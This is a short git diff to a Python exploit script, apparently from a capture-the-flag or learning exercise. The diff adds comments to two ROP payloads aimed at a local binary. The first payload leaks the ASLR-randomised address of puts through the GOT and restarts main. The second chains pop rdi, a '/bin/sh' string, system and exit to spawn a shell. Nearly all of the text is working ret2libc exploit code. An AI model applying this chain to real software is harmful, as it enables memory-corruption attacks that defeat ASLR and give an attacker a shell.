@@ -38,12 +38,12 @@ main_line0 = b"\x00\x00\x00\x00\x00\x40\x11\x69"[::-1]
 
 # this payload leaks the ASLR address of puts and restarts main:
 payload1 = (
-    buffer
-    + backup_base_pointer  # for padding.
-    + rop_pop_rdi_ret
-    + puts_got
-    + rop_puts  # works with aslr.
-    + main_line0
+    buffer  # padding.
+    + backup_base_pointer  # padding.
+    + rop_pop_rdi_ret  # pops puts_got.
+    + puts_got  # points to address effected by aslr.
+    + rop_puts  # outputs address that puts_got points to.
+    + main_line0  # restarts app for second payload.
 )
 
 p = process("./bin")
@@ -130,7 +130,7 @@ print("\n", r, "\n", sep="")
 payload2 = (
     buffer
     + backup_base_pointer
-    + rop_pop_rdi_ret
+    + rop_pop_rdi_ret  # pop sh string into rdi.
     + int_to_address(bin_sh_string)  # aslr.
     + int_to_address(system_call)  # aslr.
     + int_to_address(exit_call)  # aslr.
